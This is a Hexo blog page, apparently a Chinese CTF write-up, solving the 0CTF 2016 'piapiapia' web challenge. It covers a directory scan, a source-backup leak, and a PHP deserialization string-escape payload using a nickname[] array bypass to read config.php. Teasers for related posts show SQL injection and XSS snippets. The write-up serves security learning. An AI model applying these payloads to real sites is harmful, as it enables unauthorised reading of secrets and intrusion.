@@ -1,0 +1,259 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[0CTF 2016]piapiapia 1 | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="[0CTF 2016]piapiapia1尝试过sql和其他东西，发现没思路 dirsearch扫描，这里如果扫描速度太快可以换下面的 .&#x2F;ctf_high.txt这个字典是我自己总结的，你们可以去网上找或让ai给你总结 1python dirsearch.py -u &quot;http:&#x2F;&#x2F;cf7016da-d794-496a-ab9b-669958940227.node5.buuo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[0CTF 2016]piapiapia 1">
+<meta property="og:url" content="http://example.com/2026/03/07/ctf%E9%A2%98%E8%A7%A3/web/%5B0CTF%202016%5Dpiapiapia%201/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="[0CTF 2016]piapiapia1尝试过sql和其他东西，发现没思路 dirsearch扫描，这里如果扫描速度太快可以换下面的 .&#x2F;ctf_high.txt这个字典是我自己总结的，你们可以去网上找或让ai给你总结 1python dirsearch.py -u &quot;http:&#x2F;&#x2F;cf7016da-d794-496a-ab9b-669958940227.node5.buuo">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/avatar.png">
+<meta property="article:published_time" content="2026-03-07T06:12:24.000Z">
+<meta property="article:modified_time" content="2026-06-22T13:40:21.847Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="ZIP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/avatar.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[0CTF 2016]piapiapia 1",
+  "url": "http://example.com/2026/03/07/ctf%E9%A2%98%E8%A7%A3/web/%5B0CTF%202016%5Dpiapiapia%201/",
+  "image": "http://example.com/images/avatar.png",
+  "datePublished": "2026-03-07T06:12:24.000Z",
+  "dateModified": "2026-06-22T13:40:21.847Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "John Doe",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="http://example.com/2026/03/07/ctf%E9%A2%98%E8%A7%A3/web/%5B0CTF%202016%5Dpiapiapia%201/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[0CTF 2016]piapiapia 1',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">121</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Hexo</span></a><a class="nav-page-title" href="/"><span class="site-name">[0CTF 2016]piapiapia 1</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">[0CTF 2016]piapiapia 1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-03-07T06:12:24.000Z" title="Created 2026-03-07 14:12:24">2026-03-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-06-22T13:40:21.847Z" title="Updated 2026-06-22 21:40:21">2026-06-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h1><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>尝试过sql和其他东西，发现没思路</p>
+<p>dirsearch扫描，这里如果扫描速度太快可以换下面的</p>
+<p>.&#x2F;ctf_high.txt这个字典是我自己总结的，你们可以去网上找或让ai给你总结</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u &quot;http://cf7016da-d794-496a-ab9b-669958940227.node5.buuoj.cn:81/&quot; -t 1 -d 5 --full-url -R 5 -w ./ctf_high.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20260129202021496.png" alt="image-20260129202021496"></p>
+<p><a target="_blank" rel="noopener" href="http://www.zip打开下载了一个文件夹/">www.zip打开下载了一个文件夹</a></p>
+<p>之前在另外一道题目有了解过这个<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<p><img src="/images/image-2170920260129202300.png" alt="image-2170920260129202300.png"></p>
+<p>那么接下来进入代码审议环节</p>
+<p><img src="C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20260129202726505.png" alt="image-20260129202726505"></p>
+<p>精简一下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">C:\Users\21709\Desktop\www\config.php</span><br><span class="line">&lt;?php</span><br><span class="line">	$config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;;</span><br><span class="line">	$config[&#x27;username&#x27;] = &#x27;root&#x27;;</span><br><span class="line">	$config[&#x27;password&#x27;] = &#x27;&#x27;;</span><br><span class="line">	$config[&#x27;database&#x27;] = &#x27;&#x27;;</span><br><span class="line">	$flag = &#x27;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">//明白目标：读取config.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\21709\Desktop\www\update.php</span><br><span class="line">		move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]));</span><br><span class="line">		$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];</span><br><span class="line">		$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];</span><br><span class="line">		$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];</span><br><span class="line">		$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);</span><br><span class="line">		//这里name的值随便写，反正md5之后都是32位</span><br><span class="line">		</span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		//profile被序列化储存了</span><br><span class="line">		echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\21709\Desktop\www\profile.php</span><br><span class="line">$profile = unserialize($profile);</span><br><span class="line">//profile又被反序列化拿出来了</span><br><span class="line">		$phone = $profile[&#x27;phone&#x27;];</span><br><span class="line">		$email = $profile[&#x27;email&#x27;];</span><br><span class="line">		$nickname = $profile[&#x27;nickname&#x27;];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]))</span><br><span class="line">		//看到file_get_contents，我们只要让photo改成我们想要读取的文件config.php即可</span><br><span class="line">		所以我们要在上传序列化的profile中做一些小修改</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">	</span><br><span class="line">		</span><br><span class="line">C:\Users\21709\Desktop\www\class.php		</span><br><span class="line">		$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);</span><br><span class="line">		$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;</span><br><span class="line">		return preg_replace($safe, &#x27;hacker&#x27;, $string);</span><br><span class="line">		//这里提供一种修改思路：where-&gt;hacker,5-&gt;6,数据流篡改（反序列化字符串逃逸）</span><br></pre></td></tr></table></figure>
+
+<h2 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h2><p>正常的版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;123&quot;;s:5:&quot;email&quot;;s:3:&quot;a@a&quot;;s:8:&quot;nickname&quot;;s:5:&quot;admin&quot;;s:5:&quot;photo&quot;;s:10:&quot;upload/1.jpg&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们需要在photo前面的nickname的值塞入一堆东西，这样能让我们的<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>(34个)变成下一条指令解析</p>
+<p>但是这里别忘记对于nickname的过滤：只能是字母数字，还有长度限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10)</span><br><span class="line">			die(&#x27;Invalid nickname&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>考虑数组绕过：</p>
+<p>数组在preg_match的筛选下会返回值 false（字数ok，内容也全是字母）从而绕过检查，但是serialize仍然会处理它。</p>
+<h3 id="对nickname的构造"><a href="#对nickname的构造" class="headerlink" title="对nickname的构造"></a>对nickname的构造</h3><p>nick[]&#x3D;34个where-&gt;把想要被解析的指令挤出去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p>千万要注意：我们需要先登录才能上传profile，</p>
+<p>那么登陆之前肯定要注册，但主页是没有注册的按钮的</p>
+<p>还记得register.php吗，打开注册就行</p>
+<p>登陆后填入信息，然后抓包改数据，上传成功后再打开profile页面查看源代码，再解码就ok</p>
+<p><img src="C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20260130141530790.png" alt="image-20260130141530790"></p>
+<p><img src="C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20260130141339424.png" alt="image-20260130141339424"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2026/03/07/ctf%E9%A2%98%E8%A7%A3/web/%5B0CTF%202016%5Dpiapiapia%201/">http://example.com/2026/03/07/ctf%E9%A2%98%E8%A7%A3/web/%5B0CTF%202016%5Dpiapiapia%201/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/SQL/">SQL</a><a class="post-meta__tags" href="/tags/Python/">Python</a><a class="post-meta__tags" href="/tags/ZIP/">ZIP</a></div><div class="post-share"><div class="social-share" data-image="/images/avatar.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/03/07/ctf%E9%A2%98%E8%A7%A3/xxs%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AE%80%E7%9F%AD%E9%80%9F%E8%AE%B0/" title="xxs知识点简短速记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">xxs知识点简短速记</div></div><div class="info-2"><div class="info-item-1">xxs知识点简短速记分类： 1.反射型（外部输入后，在浏览器端输出触发） 2.存储型（东西存在文件中，web程序读取代码并输出） 知识点1：html实体编码： HTML 实体编码 的规则是： &amp;# + 十进制 ASCII 码 + ;  字母 r 的十进制 ASCII 码是 114。 所以它的 HTML 实体编码就是 r。  CSRF：到底是什么？ 黑客没偷你的证件（他拿不到 Cookie）。 黑客只是骗你点了一下按钮（利用了你还在登录状态的权限）。 结果： 在你完全不知情的情况下，你的身份被黑客**“借用”**了。 举例： &lt;img= src=1 oner&amp;#114;or=ale&amp;#114;t(1)&gt; 知识点2：Referer 是看你从哪来。 Token 是看你带没带暗号。  Sec-Fetch  Sec: 是 Security（安全）的缩写。 Fetch: 翻译为 “获取” 或 “抓取”（在编程里指代发起一个网络请求）。 合起来的意思： “安全获取元数据”（Security Fetch Metadata）。  它是浏览器在发起请求时，自动给服...</div></div></div></a><a class="pagination-related" href="/2026/03/07/ctf%E9%A2%98%E8%A7%A3/misc/NewStar%20CTF%202025%20Week1%20-%20misc%20EZ_fence/" title="NewStar CTF 2025 Week1 - misc EZ_fence"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">NewStar CTF 2025 Week1 - misc EZ_fence</div></div><div class="info-2"><div class="info-item-1">NewStar CTF 2025 Week1 - misc EZ_fence题目： “ RAR 发现一张残缺的照片竟然需 要 4 颗钉子才能钉住，照片里面似乎藏着秘密。 ” 1.说照片里面有秘密不如先看看照片里面能找到什么 -&gt;找到了flag还有rar压缩包  于是选择binwalk查看和分离(参数-e) 不知道为什么foremost分离不出来  这里面需要密码 这时候联想到栅栏fence密码和四个栏数（四个钉子），但是我们去哪里找到这个密码呢？ 2.查看属性发现高度被修改了  打开steglove改一些数据  找到宽和长修改 理解： 1.FF C0 -&gt;JPEG 的 Start of Frame 标记 2.00 11 -&gt;该段内容的长度 3.08    -&gt;精确度  就得到了图片里面的内容： 12348426513709qazwsxedcrfvtgbyhnu jmikop1QWSAERFDTYHGUIKJOPLMNBVCXZ -_rdh9zfwzSgoVA7GWtLPQJK=vwuZvjhvPyyvjnMWoSotB  2.1先用四个栏数看看解密，发现w...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/03/07/ctf%E9%A2%98%E8%A7%A3/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8web-ssrf%E5%8F%8Abuuctf%E8%A5%BF%E7%94%B5%E9%A2%98%E8%A7%A3/" title="快速入门web-ssrf及buuctf西电题解"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-07</div><div class="info-item-2">快速入门web-ssrf及buuctf西电题解</div></div><div class="info-2"><div class="info-item-1">快速入门web-ssrf及buuctf西电题解SSRF &#x3D; 服务器端请求伪造特点 主体是服务器：请求是「服务器发起」的，不是你的电脑； 权限是服务器的权限：服务器能访问的资源（本地文件、内网 IP），你本来访问不到，但通过 SSRF 就能间接访问； 核心是 “伪造请求”：你伪造一个服务器会执行的请求（比如本地文件地址、内网地址），服务器替你执行。  [网鼎杯 2018]Fakebook11.注册登陆界面，sqlmap扫描 1python dirsearch.py -u &quot;http://3992b9c4-b99e-44db-96b6-111d3cb92681.node5.buuoj.cn:81/&quot; -e php --threads 1 --delay 3 -w ./ctf_core.txt      打开备份文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo&#123;    public $na...</div></div></div></a><a class="pagination-related" href="/2026/03/07/ctf%E9%A2%98%E8%A7%A3/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8web-sql%E6%B3%A8%E5%85%A5%E5%8F%8Abuuctf%E8%A5%BF%E7%94%B5%E9%A2%98%E8%A7%A3/" title="快速入门web-sql注入及buuctf西电题解"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-07</div><div class="info-item-2">快速入门web-sql注入及buuctf西电题解</div></div><div class="info-2"><div class="info-item-1">快速入门web-sql注入及buuctf西电题解08 第八章 天衍真言，星图显圣 题解1.判断字段数order by 2 2.判断回显位 ‘union select  1,2# Welcome 1 3.数据库名 ‘union select database()# Welcome user 4.尝试查询数据库名为user下的所有表名 ‘union select group_concat(table_name),2 from information_schema.tables where table_schema&#x3D;’user’# Welcome flag,users 5.尝试查询 数据库名为user，表名为flag 下的所有列名 ‘union select group_concat(column_name),2 from information_schema.columns where table_schema&#x3D;’user’ and table_name&#x3D;’flag’# Welcome value 6.查找数据 错误答案：’union select va...</div></div></div></a><a class="pagination-related" href="/2026/02/06/ctf%E9%A2%98%E8%A7%A3/misc/%5BBJDCTF2020%5D%E8%97%8F%E8%97%8F%E8%97%8F%201/" title="[BJDCTF2020]藏藏藏 1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-06</div><div class="info-item-2">[BJDCTF2020]藏藏藏 1</div></div><div class="info-2"><div class="info-item-1">[BJDCTF2020]藏藏藏 11.0110发现有pk压缩包，还有个docx  2.kali打开 2.1解析 1binwalk 图片.jpg  //解析得到存在zip  2.2分离 1foremost 图片.jpg //分离得到图片中的压缩包，默认在output目录里面  2.3解压 1unzip ./output/zip/文件名.zip   //得到 ：福利.docx  2.4查看 1cat 福利.docx  //又发现pk文件头  2.5binwalk检测，发现很多压缩包 2.6foremost分离，此时加后缀-t，放在另一个output中 2.7tree .&#x2F;新output 12345──(kali㉿kali)-[~/Desktop]└─$ tree ./output_Thu_Dec_18_08_56_09_2025/zip ./output_Thu_Dec_18_08_56_09_2025/zip└── 00000000.zip  2.8 解压unzip .&#x2F;output_Thu_Dec_18_08_56_09_2025&#x2F;zip&#x2F;...</div></div></div></a><a class="pagination-related" href="/2026/03/08/ctf/web/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8web-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="快速入门web-内网渗透"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-08</div><div class="info-item-2">快速入门web-内网渗透</div></div><div class="info-2"><div class="info-item-1">快速入门web-内网渗透CTF 里的内网渗透，就是拿下一台机器，从这台机器出发，横向攻击内网里其他机器，最终拿到目标 flag。 你可以把内网理解成一个 “封闭的局域网”—— 你一开始只能直接接触到一台 “边界机器”（比如 Web 服务器），但内网里还藏着数据库、其他服务器、甚至存储 flag 的主机，这些机器你没法直接访问，只能靠已经拿下的机器当 “跳板”。 CTF 内网渗透的核心步骤（Web 入口为例） 拿下边界机器（突破口）  先通过 Web 漏洞（比如 PHP 代码执行、文件上传、SSRF）拿到这台 Web 服务器的权限（比如shell）。 这一步是内网渗透的基础，没有这个跳板就没法继续。 内网信息收集 在跳板机上执行命令，摸清内网情况：  查内网 IP 段：ifconfig&#x2F;ip a（比如发现内网是192.168.1.0/24）； 扫内网存活主机和开放端口：ping、nmap（比如发现192.168.1.10开了 MySQL 端口）； 找敏感信息：查看服务器里的配置文件（比如数据库账号密码、其他机器的登录凭证）。  横向移动（攻击其他机器） 用收集到的信息攻击...</div></div></div></a><a class="pagination-related" href="/2026/03/16/ctf%E9%A2%98%E8%A7%A3/web/%5BGWCTF%202019%5D%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93%201/" title="[GWCTF 2019]我有一个数据库 1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-16</div><div class="info-item-2">[GWCTF 2019]我有一个数据库 1</div></div><div class="info-2"><div class="info-item-1">[GWCTF 2019]我有一个数据库1页面一打开，抓包看到了数据库，一开始想到的sql注入，但明确没有注入点，所以我们扫扫文件看看有什么有用的信息  看到phpmyadmin，可以联想到某项版本下是存在漏洞的  打开phpmyadmin页面，看到了具体的版本  查找这个版本对应的漏洞  phpMyAdmin 4.8.1 远程文件包含漏洞简介phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。 在phpMyAdmin 4.8.2 之前的 4.8.x 版本中，其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。 漏洞还原：文件&#x2F;index.php代码 123456789if (! empty($_REQUEST[&#x27;target&#x27;])    &amp;&amp; is_string($_REQUEST[&#x27;target&#x27;])    &amp;&amp; ! preg_match(&#x27;/^index/&#x27;, $_REQUEST[&#x27;target&#x27;...</div></div></div></a><a class="pagination-related" href="/2026/03/14/ctf%E9%A2%98%E8%A7%A3/misc/NewStar%20CTF%202025%20Week1%20-%20Misc%20Misc%20%E5%9F%8E%E9%82%A6%EF%BC%9A%E5%8E%8B%E7%BC%A9%E6%9C%AF/" title="NewStar CTF 2025 Week1 - Misc Misc 城邦：压缩术"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-14</div><div class="info-item-2">NewStar CTF 2025 Week1 - Misc Misc 城邦：压缩术</div></div><div class="info-2"><div class="info-item-1">明文攻击详解NewStar CTF 2025 Week1 - Misc 